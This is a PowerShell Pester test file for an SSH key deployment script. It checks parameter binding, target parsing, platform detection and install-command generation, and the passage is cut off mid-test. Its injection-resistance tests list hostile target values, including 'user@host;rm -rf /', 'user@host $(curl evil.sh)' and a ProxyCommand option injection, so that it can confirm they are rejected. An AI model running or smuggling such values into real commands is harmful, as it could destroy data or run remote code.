#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '6.0.0' }

<#
.SYNOPSIS
    Pester tests for Deploy-SshKey.ps1

.DESCRIPTION
    Exercises the real function implementations by dot-sourcing the script under test.
    Deploy-SshKey.ps1 guards its main body with a dot-source check, so loading it here
    defines the functions without generating keys or contacting any host.

    Test types, selectable by tag:
    - Unit        Deterministic logic tests
    - Security    Input validation and injection resistance
    - Performance Execution-time baselines for bulk input
    - Integration Assertions against real filesystem permissions, skipped automatically
                  where the environment cannot read a file ACL

    Every test is offline. SSH itself is exercised through a stub script and nothing is
    written outside Pester's TestDrive. The one exception is the banner-probe test, which
    talks to a loopback listener the test starts itself; it is tagged Integration.

    To run:
        Invoke-Pester -Path .\Deploy-SshKey.Tests.ps1 -Output Detailed
        Invoke-Pester -Path .\Deploy-SshKey.Tests.ps1 -TagFilter Security

.NOTES
    Author: Jeffrey Stuhr
    Blog: https://www.techbyjeff.net
    LinkedIn: https://www.linkedin.com/in/jeffrey-stuhr-034214aa/
    Last Updated: 2026-08-01
    Requires: Pester 6.0 or later
#>

BeforeDiscovery {
    # Pester 6 discovers and runs one file at a time, so this file performs its own
    # discovery-time setup. These flags decide which tests are built.
    $script:SkipWithoutKeygen = -not [bool](Get-Command ssh-keygen -ErrorAction SilentlyContinue)

    # Reading a file ACL is not possible everywhere: restricted shells, redirected or
    # non-NTFS TEMP, and hosted runspaces all interfere. Permission assertions are
    # skipped there instead of reported as product failures; the deterministic icacls
    # assertions still run.
    $script:SkipWithoutAcl = $true
    try {
        $aclProbePath = [System.IO.Path]::GetTempFileName()
        $script:SkipWithoutAcl = $null -eq (Get-Acl -LiteralPath $aclProbePath -ErrorAction Stop)
        Remove-Item -LiteralPath $aclProbePath -Force -ErrorAction SilentlyContinue
    }
    catch {
        $script:SkipWithoutAcl = $true
    }

    # A POSIX shell to syntax-check the generated install command with. Git for Windows ships
    # one. Without this the command is only ever validated by running it against a real host,
    # which is how a stray separator after "then" reached production once already.
    $script:PosixShell = $null
    foreach ($candidateShell in @(
            'sh',
            "$env:ProgramFiles\Git\usr\bin\sh.exe",
            "${env:ProgramFiles(x86)}\Git\usr\bin\sh.exe")) {
        $resolvedShell = Get-Command $candidateShell -ErrorAction SilentlyContinue
        if ($resolvedShell) {
            $script:PosixShell = $resolvedShell.Source
            break
        }
    }
    $script:SkipWithoutShell = -not $script:PosixShell

    # Note there is deliberately no skip flag for the client's native-quoting behaviour.
    # Test-NativeQuotingSafe is a function, so both answers can be mocked, and every
    # transport test then runs on every host. Skipping on the real answer meant the unsafe
    # branch never executed under pwsh 7 - and that branch is the one a 5.1 operator relies
    # on, so it is exactly the one that must not go unexercised.
}

BeforeAll {
    $scriptPath = Join-Path $PSScriptRoot 'Deploy-SshKey.ps1'
    if (-not (Test-Path $scriptPath)) {
        throw "Script under test not found: $scriptPath"
    }

    # Loads the functions only - the dot-source guard suppresses the deployment body
    . $scriptPath

    # BeforeDiscovery resolves this for the -Skip decision; test bodies run in a different
    # scope and need their own copy
    $script:PosixShell = $null
    foreach ($candidateShell in @(
            'sh',
            "$env:ProgramFiles\Git\usr\bin\sh.exe",
            "${env:ProgramFiles(x86)}\Git\usr\bin\sh.exe")) {
        $resolvedShell = Get-Command $candidateShell -ErrorAction SilentlyContinue
        if ($resolvedShell) {
            $script:PosixShell = $resolvedShell.Source
            break
        }
    }
}


Describe 'Deploy-SshKey script contract' -Tag 'Unit' {

    Context 'Parameter Validation' {

        It 'declares <ParameterName> as <TypeName>' -ForEach @(
            @{ ParameterName = 'ComputerName'; TypeName = 'string[]' }
            @{ ParameterName = 'HostFile'; TypeName = 'string' }
            @{ ParameterName = 'User'; TypeName = 'string' }
            @{ ParameterName = 'Port'; TypeName = 'int' }
            @{ ParameterName = 'KeyPath'; TypeName = 'string' }
            @{ ParameterName = 'TargetPlatform'; TypeName = 'string' }
            @{ ParameterName = 'WindowsKeyLocation'; TypeName = 'string' }
            @{ ParameterName = 'CorrelationId'; TypeName = 'string' }
        ) {
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $command.Parameters[$ParameterName].ParameterType.Name |
                Should-BeLikeString "$($TypeName.TrimEnd('[', ']'))*"
        }

        It 'keeps the Hosts alias so existing callers keep working' {
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $command.Parameters['ComputerName'].Aliases | Should-ContainCollection @('Hosts')
        }

        It 'takes the target positionally, the way ssh-copy-id does' {
            # "Deploy-SshKey.ps1 root@server1" should read like "ssh-copy-id root@server1"
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $positions = @($command.Parameters['ComputerName'].Attributes |
                    Where-Object { $_ -is [System.Management.Automation.ParameterAttribute] } |
                    ForEach-Object { $_.Position })

            $positions | Should-ContainCollection @(0)
        }

        It 'gives <ParameterName> the ssh-copy-id short form <AliasName>' -ForEach @(
            @{ ParameterName = 'KeyPath'; AliasName = 'i' }
            @{ ParameterName = 'KeyPath'; AliasName = 'IdentityFile' }
            @{ ParameterName = 'SshOption'; AliasName = 'o' }
            @{ ParameterName = 'SshOption'; AliasName = 'Option' }
            @{ ParameterName = 'Port'; AliasName = 'p' }
            @{ ParameterName = 'RemoteAuthorizedKeysPath'; AliasName = 'TargetPath' }
            @{ ParameterName = 'SshConfigFile'; AliasName = 'ConfigFile' }
            @{ ParameterName = 'UseSftp'; AliasName = 'Sftp' }
            @{ ParameterName = 'TraceRemoteCommand'; AliasName = 'x' }
        ) {
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $command.Parameters[$ParameterName].Aliases | Should-ContainCollection @($AliasName)
        }

        It 'leaves -<Letter> unbound, because it would resolve to the wrong thing' -ForEach @(
            # PowerShell parameter names are not case-sensitive, so -f and -F are one name
            # and ssh-copy-id's force/config-file distinction cannot survive. Binding either
            # would silently give an ssh-copy-id user the other one.
            @{ Letter = 'f'; Reason = 'ssh-copy-id -f and -F collide once case is ignored' }
            @{ Letter = 'F'; Reason = 'same parameter as -f here' }
            # "-t Windows" is the obvious way to ask for a Windows target. Bound to
            # -RemoteAuthorizedKeysPath it would install to a relative path named Windows.
            @{ Letter = 't'; Reason = '-t Windows would become a remote path' }
            # Bound to the -UseSftp switch, the following word would be read as a hostname
            @{ Letter = 's'; Reason = '-s would swallow the next token' }
        ) {
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $bound = @($command.Parameters.Values |
                    Where-Object { $_.Aliases -contains $Letter })

            $bound | Should-BeCollection -Count 0 -Because $Reason
        }

        It 'exposes comment-based help that PowerShell actually parses' {
            # A line inside the help block beginning with an unrecognised dot-keyword makes
            # PowerShell discard the entire block and fall back to reflection, silently. It
            # happened with a wrapped ".NET Framework ..." line: every .PARAMETER vanished
            # from Get-Help while the file still parsed and every other test passed.
            $help = Get-Help (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1') -Full

            # The reflection fallback puts the generated syntax line in Synopsis
            $help.Synopsis | Should-NotMatchString '^\s*Deploy-SshKey\.ps1\s+\['
            @($help.parameters.parameter).Count | Should-BeGreaterThan 20
        }

        It 'uses only recognised keywords inside the help block' {
            $scriptPath = Join-Path $PSScriptRoot 'Deploy-SshKey.ps1'
            $lines = Get-Content -LiteralPath $scriptPath
            $blockEnd = (1..$lines.Count | Where-Object { $lines[$_ - 1] -eq '#>' })[0]

            $recognised = @(
                'SYNOPSIS', 'DESCRIPTION', 'PARAMETER', 'EXAMPLE', 'INPUTS', 'OUTPUTS'
                'NOTES', 'LINK', 'COMPONENT', 'ROLE', 'FUNCTIONALITY'
                'FORWARDHELPTARGETNAME', 'FORWARDHELPCATEGORY', 'REMOTEHELPRUNSPACE'
                'EXTERNALHELP'
            )

            $offenders = @(
                foreach ($index in 1..$blockEnd) {
                    if ($lines[$index - 1] -match '^\s*\.([A-Za-z]+)' -and
                        $Matches[1].ToUpperInvariant() -notin $recognised) {
                        "line ${index}: $($lines[$index - 1].Trim())"
                    }
                }
            )

            $offenders | Should-BeCollection -Count 0
        }

        It 'supports ShouldProcess so -WhatIf is honoured' {
            $command = Get-Command (Join-Path $PSScriptRoot 'Deploy-SshKey.ps1')

            $command.Parameters.Keys | Should-ContainCollection @('WhatIf')
        }

        It 'defines every function it relies on: <FunctionName>' -ForEach @(
            @{ FunctionName = 'Invoke-DeploySshKey' }
            @{ FunctionName = 'Get-OpenSshTool' }
            @{ FunctionName = 'Resolve-TargetList' }
            @{ FunctionName = 'Test-ValidTarget' }
            @{ FunctionName = 'Initialize-KeyPair' }
            @{ FunctionName = 'Set-PrivateKeyAcl' }
            @{ FunctionName = 'Test-PasswordlessAccess' }
            @{ FunctionName = 'Install-PublicKey' }
            @{ FunctionName = 'Get-RemoteSshBanner' }
            @{ FunctionName = 'Resolve-RemotePlatform' }
            @{ FunctionName = 'New-PosixInstallCommand' }
            @{ FunctionName = 'New-WindowsInstallCommand' }
            @{ FunctionName = 'Update-SshConfigEntry' }
            @{ FunctionName = 'New-SampleHostFile' }
        ) {
            Get-Command $FunctionName -CommandType Function | Should-NotBeNull
        }
    }
}


Describe 'Console output helpers' -Tag 'Unit' {

    Context 'Core Functionality' {

        It '<HelperName> prefixes its message with <Prefix>' -ForEach @(
            @{ HelperName = 'Write-Info'; Prefix = '[*]' }
            @{ HelperName = 'Write-Ok'; Prefix = '[+]' }
            @{ HelperName = 'Write-Note'; Prefix = '[!]' }
            @{ HelperName = 'Write-Bad'; Prefix = '[x]' }
        ) {
            Mock Write-Host {}

            & $HelperName -Message 'hello'

            Should-Invoke Write-Host -Times 1 -Exactly -ParameterFilter {
                $Object -eq "$Prefix hello"
            }
        }
    }
}


Describe 'Test-ValidTarget' -Tag 'Unit' {

    Context 'Parameter Validation' {

        It 'accepts <Target> (<Reason>)' -ForEach @(
            @{ Target = 'root@192.168.66.23'; Reason = 'IPv4' }
            @{ Target = 'admin@server2'; Reason = 'short hostname' }
            @{ Target = 'jeff@host.example.com'; Reason = 'FQDN' }
            @{ Target = 'user@host-01'; Reason = 'hyphen in hostname' }
            @{ Target = 'user@[fe80::1]'; Reason = 'bracketed IPv6' }
            @{ Target = 'first.last@host'; Reason = 'dotted username' }
            @{ Target = 'admin@corp.example@server1'; Reason = 'UPN login, which ssh accepts' }
        ) {
            Test-ValidTarget -Target $Target | Should-BeTrue
        }

        It 'rejects <Target> (<Reason>)' -ForEach @(
            @{ Target = ''; Reason = 'empty' }
            @{ Target = '   '; Reason = 'whitespace only' }
            @{ Target = 'bad host@lab2'; Reason = 'embedded space' }
            @{ Target = 'plainhost'; Reason = 'no user part' }
            @{ Target = 'user@'; Reason = 'no host part' }
            @{ Target = '@host'; Reason = 'no user part' }
            @{ Target = 'user@@host'; Reason = 'empty segment between separators' }
        ) {
            Test-ValidTarget -Target $Target | Should-BeFalse
        }
    }

    Context 'Injection resistance' -Tag 'Security' {

        It 'rejects <Target> (<Reason>)' -ForEach @(
            @{ Target = '-oProxyCommand=calc.exe@x'; Reason = 'ssh option injection' }
            @{ Target = '-J@jump'; Reason = 'leading dash reads as an option' }
            @{ Target = 'user@host;whoami'; Reason = 'command separator' }
            @{ Target = 'user@host|whoami'; Reason = 'pipe' }
            @{ Target = 'user@host&whoami'; Reason = 'background operator' }
            @{ Target = 'user@host$(id)'; Reason = 'subexpression' }
            @{ Target = 'user@host`id`'; Reason = 'backtick substitution' }
            @{ Target = "user@host`nsecond"; Reason = 'embedded newline' }
        ) {
            Test-ValidTarget -Target $Target | Should-BeFalse
        }

        It 'rejects every entry a hostile host file could smuggle in' {
            $hostile = @(
                '-oProxyCommand=calc.exe@x'
                'user@host;rm -rf /'
                'user@host $(curl evil.sh)'
            )

            $accepted = @($hostile | Where-Object { Test-ValidTarget -Target $_ })

            Should-BeCollection -Actual $accepted -Count 0 `
                -Because 'no hostile entry may reach the ssh command line'
        }
    }
}


Describe 'Get-SshTargetPart' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'splits <Target> into user <ExpectedUser> and host <ExpectedHost>' -ForEach @(
            @{ Target = 'root@10.0.0.5'; ExpectedUser = 'root'; ExpectedHost = '10.0.0.5' }
            @{ Target = 'jeff@host.example.com'; ExpectedUser = 'jeff'; ExpectedHost = 'host.example.com' }
            @{ Target = 'user@[fe80::1]'; ExpectedUser = 'user'; ExpectedHost = '[fe80::1]' }
        ) {
            $parts = Get-SshTargetPart -Target $Target

            $parts.User | Should-Be $ExpectedUser
            $parts.HostAddress | Should-Be $ExpectedHost
        }

        It 'splits on the last separator so a UPN login keeps its domain' {
            # Splitting on the first '@' would resolve this to the account 'admin' on the
            # host 'corp.example@server1', which is not a host at all
            $parts = Get-SshTargetPart -Target 'admin@corp.example@server1'

            $parts.User | Should-Be 'admin@corp.example'
            $parts.HostAddress | Should-Be 'server1'
        }

        It 'treats a bare host as having no user' {
            $parts = Get-SshTargetPart -Target 'server1'

            $parts.User | Should-Be ''
            $parts.HostAddress | Should-Be 'server1'
        }
    }
}


Describe 'Test-PrivateKeyEncrypted' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'reports an unencrypted ed25519 key as clear' -Skip:$script:SkipWithoutKeygen {
            $keyPath = Join-Path $TestDrive 'clearkey\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null

            # Generated through the script's own routine: passing an empty -N on the command
            # line is exactly the quoting trap Initialize-KeyPair exists to work around
            Mock Write-Info {}
            Mock Write-Ok {}
            Mock Write-Note {}
            $null = Initialize-KeyPair -KeyPath $keyPath -KeyType 'ed25519' -Comment 'test@ws' `
                -SshKeygenPath (Get-Command ssh-keygen).Source

            Test-PrivateKeyEncrypted -KeyPath $keyPath | Should-BeFalse
        }

        It 'reports a passphrase-protected key as encrypted' -Skip:$script:SkipWithoutKeygen {
            # This is what makes every BatchMode probe fail, so the run must know about it
            # rather than reporting Failed for hosts where the key works
            $keyPath = Join-Path $TestDrive 'lockedkey\id_ed25519'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            & ssh-keygen -t ed25519 -f $keyPath -N 'correct horse' -C 'test@ws' -q 2>&1 | Out-Null

            Test-PrivateKeyEncrypted -KeyPath $keyPath | Should-BeTrue
        }

        It 'recognises the cleartext marker on a legacy PEM key' {
            $keyPath = Join-Path $TestDrive 'pemkey\id_rsa'
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath @(
                '-----BEGIN RSA PRIVATE KEY-----'
                'Proc-Type: 4,ENCRYPTED'
                'DEK-Info: AES-128-CBC,0123456789ABCDEF'
                ''
                'AAAA'
                '-----END RSA PRIVATE KEY-----'
            ) -Encoding ascii

            Test-PrivateKeyEncrypted -KeyPath $keyPath | Should-BeTrue
        }
    }

    Context 'Error Handling' {

        It 'reports clear rather than throwing for <Reason>' -ForEach @(
            @{ Content = 'not a key at all'; Reason = 'a file that is not a key' }
            @{ Content = '-----BEGIN OPENSSH PRIVATE KEY-----|!!!not base64!!!|-----END OPENSSH PRIVATE KEY-----'
                Reason  = 'a corrupt body'
            }
        ) {
            $keyPath = Join-Path $TestDrive "junk-$([guid]::NewGuid().ToString('N'))\key"
            New-Item -ItemType Directory -Path (Split-Path $keyPath -Parent) -Force | Out-Null
            Set-Content $keyPath ($Content -split '\|') -Encoding ascii

            Test-PrivateKeyEncrypted -KeyPath $keyPath | Should-BeFalse
        }

        It 'reports clear for a missing file' {
            Test-PrivateKeyEncrypted -KeyPath (Join-Path $TestDrive 'nothing\here') |
                Should-BeFalse
        }
    }
}


Describe 'Get-SshEffectiveConfig' -Tag 'Unit' {

    BeforeAll {
        # Stands in for "ssh -G", which prints the settings ssh resolved for a destination
        $script:configStub = Join-Path $TestDrive 'sshg\ssh.ps1'
        New-Item -ItemType Directory -Path (Split-Path $script:configStub -Parent) -Force | Out-Null
        @'
'user deployuser'
'hostname 10.0.0.5'
'port 2222'
'port 9999'
'@ | Set-Content $script:configStub -Encoding ascii
    }

    Context 'Core Functionality' {

        It 'reads the user, hostname and port ssh resolved' {
            $config = Get-SshEffectiveConfig -SshPath $script:configStub -Target 'pve'

            $config.User | Should-Be 'deployuser'
            $config.HostName | Should-Be '10.0.0.5'
            $config.Port | Should-Be 2222
        }

        It 'keeps the first value, which is the one ssh itself would use' {
            (Get-SshEffectiveConfig -SshPath $script:configStub -Target 'pve').Port |
                Should-Be 2222
        }
    }

    Context 'Error Handling' {

        It 'returns empty values rather than throwing when ssh cannot be run' {
            $config = Get-SshEffectiveConfig -SshPath (Join-Path $TestDrive 'no-such-ssh.exe') `
                -Target 'pve'

            $config.Port | Should-Be 0
            $config.User | Should-Be ''
        }
    }
}


Describe 'Resolve-TargetList' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'applies the default user to bare hosts and preserves explicit ones' {
            $result = @(Resolve-TargetList -ProvidedHosts @('server1', 'admin@server2') -DefaultUser 'jeff')

            $result | Should-ContainCollection @('jeff@server1')
            $result | Should-ContainCollection @('admin@server2')
        }

        It 'removes duplicate targets' {
            $hosts = @('server1', 'server1', 'jeff@server1')

            $result = @(Resolve-TargetList -ProvidedHosts $hosts -DefaultUser 'jeff')

            Should-BeCollection -Actual $result -Count 1
            $result[0] | Should-Be 'jeff@server1'
        }

        It 'trims surrounding whitespace from entries' {
            $result = @(Resolve-TargetList -ProvidedHosts @('  server1  ') -DefaultUser 'jeff')

            $result[0] | Should-Be 'jeff@server1'
        }

        It 'ignores comments and blank lines in a host file' {
            $hostFile = Join-Path $TestDrive 'hosts.txt'
            Set-Content $hostFile @('# a comment', '', '   ', 'server1', 'admin@server2') -Encoding ascii

            $result = @(Resolve-TargetList -ProvidedHostFile $hostFile -DefaultUser 'jeff')

            Should-BeCollection -Actual $result -Count 2
            $result | Should-NotContainCollection @('jeff@# a comment')
        }

        It 'combines host file entries with directly supplied hosts' {
            $hostFile = Join-Path $TestDrive 'combine.txt'
            Set-Content $hostFile @('fromfile') -Encoding ascii

            $result = @(Resolve-TargetList -ProvidedHosts @('direct') -ProvidedHostFile $hostFile `
                    -DefaultUser 'jeff')

            $result | Should-ContainCollection @('jeff@direct')
            $result | Should-ContainCollection @('jeff@fromfile')
        }

        It 'asks the resolver for the user of a bare host' {
            # Without this a Host block that sets "User deployuser" is overwritten by the
            # local Windows username, which is the account ssh would never have used
            $resolved = @(Resolve-TargetList -ProvidedHosts @('pve') -DefaultUser 'jeff' `
                    -UserResolver { param($HostEntry) "user-for-$HostEntry" })

            $resolved[0] | Should-Be 'user-for-pve@pve' `
                -Because 'the resolver has to be told which host it is answering for'
        }

        It 'never consults the resolver for an entry that names its own user' {
            $resolved = @(Resolve-TargetList -ProvidedHosts @('admin@server2') -DefaultUser 'jeff' `
                    -UserResolver { throw 'the resolver must not run' })

            $resolved[0] | Should-Be 'admin@server2'
        }

        It 'falls back to the default user when the resolver answers with nothing' {
            $resolved = @(Resolve-TargetList -ProvidedHosts @('server1') -DefaultUser 'jeff' `
                    -UserResolver { '' })

            $resolved[0] | Should-Be 'jeff@server1'
        }

        It 'falls back to the default user when the resolver fails' {
            $resolved = @(Resolve-TargetList -ProvidedHosts @('server1') -DefaultUser 'jeff' `
                    -UserResolver { throw 'ssh -G exploded' })

            $resolved[0] | Should-Be 'jeff@server1'
        }

        It 'accepts hosts typed at the prompt when none were supplied' {
            Mock Read-Host { 'server1, admin@server2' }

            $result = @(Resolve-TargetList -DefaultUser 'jeff' -AllowPrompt)

            $result | Should-ContainCollection @('jeff@server1')
            $result | Should-ContainCollection @('admin@server2')
        }

        It 'never prompts unless prompting was explicitly allowed' {
            # An automated run has nobody to answer. Prompting there hangs a CI job or dies
            # with a message about the console rather than about the missing host list.
            Mock Read-Host { 'should-never-be-called' }

            { Resolve-TargetList -DefaultUser 'jeff' } |
                Should-Throw -ExceptionMessage '*No hosts were specified*'

            Should-NotInvoke Read-Host
        }

        It 'reports the missing host list, not the missing console, when it cannot ask' {
            # Read-Host throws where there is no console. The useful diagnosis is that no
            # hosts were supplied; a console-handle error would bury that.
            Mock Read-Host { throw 'A command that prompts the user failed because...' }

            { Resolve-TargetList -DefaultUser 'jeff' -AllowPrompt } |
                Should-Throw -ExceptionMessage '*No hosts were specified*'
        }
    }

    Context 'Error Handling' {

        It 'terminates with a clear message when the host file is missing' {
            $missing = Join-Path $TestDrive 'nope.txt'

            { Resolve-TargetList -ProvidedHostFile $missing -DefaultUser 'jeff' } |
                Should-Throw -ExceptionMessage '*Host file not found*'
        }

        It 'terminates when nothing is supplied and nothing is entered' {
            Mock Read-Host { '' }

            { Resolve-TargetList -DefaultUser 'jeff' -AllowPrompt } |
                Should-Throw -ExceptionMessage '*No hosts were specified*'
        }
    }

    Context 'Performance Requirements' -Tag 'Performance' {

        It 'resolves 1000 hosts within the baseline' {
            $many = 1..1000 | ForEach-Object { "server$_" }

            { $null = Resolve-TargetList -ProvidedHosts $many -DefaultUser 'jeff' } |
                Should-BeFasterThan '10s'
        }
    }
}


Describe 'Get-OpenSshTool' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'returns the resolved ssh and ssh-keygen paths' {
            $tools = Get-OpenSshTool

            $tools.Ssh | Should-NotBeNull
            $tools.SshKeygen | Should-NotBeNull
            $tools.PSObject.TypeNames[0] | Should-Be 'OpenSshToolPath'
        }
    }

    Context 'Error Handling' {

        It 'terminates when the OpenSSH client is unavailable' {
            Mock Write-Bad {}
            Mock Write-Host {}
            Mock Get-Command { $null } -ParameterFilter { $Name -in @('ssh', 'ssh-keygen') }

            { Get-OpenSshTool } | Should-Throw -ExceptionMessage '*OpenSSH tools are missing*'
        }
    }
}


Describe 'Resolve-RemotePlatform' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Note {}
    }

    Context 'Core Functionality' {

        It 'reports Windows for a banner from Microsoft''s OpenSSH port' {
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_for_Windows_9.5' }

            Resolve-RemotePlatform -Target 'admin@fs01' -Port 22 -Preference 'Auto' |
                Should-Be 'Windows'
        }

        It 'reports Linux for a stock OpenSSH banner' {
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_9.6p1 Debian-4' }

            Resolve-RemotePlatform -Target 'root@web01' -Port 22 -Preference 'Auto' |
                Should-Be 'Linux'
        }

        It 'treats a Cygwin build as POSIX because its paths are POSIX' {
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_9.6' }

            Resolve-RemotePlatform -Target 'admin@legacy' -Port 22 -Preference 'Auto' |
                Should-Be 'Linux'
        }

        It 'probes the host portion of a user@host target' {
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_9.6' }

            $null = Resolve-RemotePlatform -Target 'root@10.0.0.5' -Port 2222 -Preference 'Auto'

            Should-Invoke Get-RemoteSshBanner -Times 1 -Exactly -ParameterFilter {
                $HostAddress -eq '10.0.0.5' -and $Port -eq 2222
            }
        }

        It 'prefers the address ssh resolved over an alias DNS cannot answer' {
            # A Host block's HostName means the target names an alias. The probe opens a raw
            # socket, so without this it fails to connect and every alias falls back to POSIX.
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_for_Windows_9.5' }

            $platform = Resolve-RemotePlatform -Target 'administrator@labwin' -Port 22 `
                -Preference 'Auto' -ResolvedHostAddress '192.168.66.48'

            $platform | Should-Be 'Windows'
            Should-Invoke Get-RemoteSshBanner -Times 1 -Exactly -ParameterFilter {
                $HostAddress -eq '192.168.66.48'
            }
        }

        It 'falls back to the target when ssh resolved no address' {
            Mock Get-RemoteSshBanner { 'SSH-2.0-OpenSSH_9.6' }

            $null = Resolve-RemotePlatform -Target 'root@10.0.0.5' -Port 22 -Preference 'Auto' `
                -ResolvedHostAddress ''

            Should-Invoke Get-RemoteSshBanner -Times 1 -Exactly -ParameterFilter {
                $HostAddress -eq '10.0.0.5'
            }
        }
    }

    Context 'Explicit platform' {

        It 'honours <Preference> without probing the host' -ForEach @(
            @{ Preference = 'Windows' }
            @{ Preference = 'Linux' }
        ) {
            Mock Get-RemoteSshBanner { throw 'the probe must not run' }

            Resolve-RemotePlatform -Target 'root@10.0.0.5' -Port 22 -Preference $Preference |
                Should-Be $Preference

            Should-NotInvoke Get-RemoteSshBanner
        }
    }

    Context 'Error Handling' {

        It 'falls back to POSIX and says so when no banner is returned' {
            Mock Get-RemoteSshBanner { '' }

            Resolve-RemotePlatform -Target 'root@unreachable' -Port 22 -Preference 'Auto' |
                Should-Be 'Linux'

            Should-Invoke Write-Note -ParameterFilter { $Message -match 'assuming a POSIX target' }
        }
    }
}


Describe 'Get-RemoteSshBanner' -Tag 'Unit' {

    Context 'Error Handling' {

        It 'returns an empty string rather than throwing when nothing is listening' {
            # Port 1 on the loopback address: reserved, and never served by anything here
            $banner = Get-RemoteSshBanner -HostAddress '127.0.0.1' -Port 1 -TimeoutMs 1000

            $banner | Should-Be ''
        }

        It 'returns an empty string for an unresolvable host' {
            $banner = Get-RemoteSshBanner -HostAddress 'no-such-host.invalid' -Port 22 -TimeoutMs 1000

            $banner | Should-Be ''
        }
    }

    Context 'Address families' {

        It 'opens a socket that can carry IPv6' {
            # TcpClient's parameterless constructor is IPv4-only on .NET Framework, so under
            # Windows PowerShell 5.1 an IPv6 literal threw "None of the discovered or
            # specified addresses match the socket address family" and every IPv6 host was
            # silently assumed POSIX. .NET Core defaults to dual-mode, which hid it on 7.
            $client = [System.Net.Sockets.TcpClient]::new([System.Net.Sockets.AddressFamily]::InterNetworkV6)
            try {
                $client.Client.DualMode = $true
                $client.Client.AddressFamily | Should-Be ([System.Net.Sockets.AddressFamily]::InterNetworkV6)
                $client.Client.DualMode | Should-BeTrue `
                    -Because 'the same socket must still reach IPv4 hosts'
            }
            finally {
                $client.Dispose()
            }
        }

        It 'returns empty for an IPv6 literal with nothing listening, rather than throwing' {
            # ::1 port 1 is reserved and never served; the point is that the IPv6 path is
            # reached at all instead of failing on the socket family
            Get-RemoteSshBanner -HostAddress '::1' -Port 1 -TimeoutMs 1000 | Should-Be ''
        }

        It 'strips brackets from an IPv6 literal before connecting' {
            Get-RemoteSshBanner -HostAddress '[::1]' -Port 1 -TimeoutMs 1000 | Should-Be ''
        }
    }

    Context 'Banner read' -Tag 'Integration' {

        It 'reads the identification string a server sends before authentication' {
            # A loopback listener stands in for sshd. The server half runs in a background
            # job because the read under test blocks until the banner arrives.
            $probe = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
            $probe.Start()
            $port = $probe.LocalEndpoint.Port
            $probe.Stop()

            $job = Start-Job -ScriptBlock {
                $listener = [System.Net.Sockets.TcpListener]::new(
                    [System.Net.IPAddress]::Loopback, $using:port)
                $listener.Start()
                try {
                    $client = $listener.AcceptTcpClient()
                    $bytes = [System.Text.Encoding]::ASCII.GetBytes(
                        "SSH-2.0-OpenSSH_for_Windows_9.5`r`n")
                    $client.GetStream().Write($bytes, 0, $bytes.Length)
                    $client.GetStream().Flush()
                    Start-Sleep -Milliseconds 250
                    $client.Close()
                }
                finally {
                    $listener.Stop()
                }
            }

            try {
                # The job needs a moment to bind; a failed connect returns '' immediately,
                # so retrying costs nothing and removes the startup race
                $banner = ''
                foreach ($attempt in 1..20) {
                    $banner = Get-RemoteSshBanner -HostAddress '127.0.0.1' -Port $port -TimeoutMs 2000
                    if ($banner) {
                        break
                    }
                    Start-Sleep -Milliseconds 250
                }

                $banner | Should-MatchString 'OpenSSH_for_Windows'
            }
            finally {
                Remove-Job -Job $job -Force
            }
        }
    }
}


Describe 'New-PosixInstallCommand' -Tag 'Unit' {

    BeforeAll {
        $script:oneKey = @('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY jeff@ws')

        function Get-DecodedPosixScript {
            param([string]$Command)

            # "echo <base64> | base64 -d | sh"
            return [System.Text.Encoding]::UTF8.GetString(
                [System.Convert]::FromBase64String(($Command -split ' ')[1]))
        }

        # Most assertions below decode the same single-key body. Spelling the whole build
        # and decode chain out in each one added no clarity and pushed the lines past the
        # width limit.
        function Get-OneKeyBody {
            param([string]$RemotePath = '')

            $command = if ($RemotePath) {
                New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded `
                    -RemotePath $RemotePath
            }
            else {
                New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded
            }

            return Get-DecodedPosixScript -Command $command
        }
    }

    Context 'Transport selection' {

        It 'reports this host as quote-safe or not, by capability rather than version' {
            # The only test here that must see the real host, because it is the capability
            # detector itself. pwsh 7.2+ escapes embedded quotes and exposes the preference
            # variable; 5.1 and 6.0-7.1 do neither. A version test would miss 7.2+ that a
            # profile has put back into Legacy mode.
            $mode = Get-Variable -Name 'PSNativeCommandArgumentPassing' -ValueOnly -ErrorAction SilentlyContinue
            $expected = [bool]($mode -and $mode -ne 'Legacy')

            Test-NativeQuotingSafe | Should-Be $expected
        }

        # The rest mock the detector, so both branches are exercised wherever these run
        It 'sends a base64 blob when asked for Encoded' {
            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded |
                Should-MatchString '^echo [A-Za-z0-9+/=]+ \| base64 -d \| sh$'
        }

        It 'sends a plain shell command when asked for Direct' {
            Mock Test-NativeQuotingSafe { $true }

            # Needs no base64 on the target, which is the whole point of the direct form
            $command = New-PosixInstallCommand -PublicKey $script:oneKey -Transport Direct

            $command | Should-MatchString "^exec sh -c '"
            $command | Should-NotMatchString 'base64'
        }

        It 'refuses Direct on a client that would shred the quoting' {
            Mock Test-NativeQuotingSafe { $false }

            # The body still parses there, but "$@" degrades to word splitting, so one key
            # arrives as several fragments and the run reports success over a corrupt file
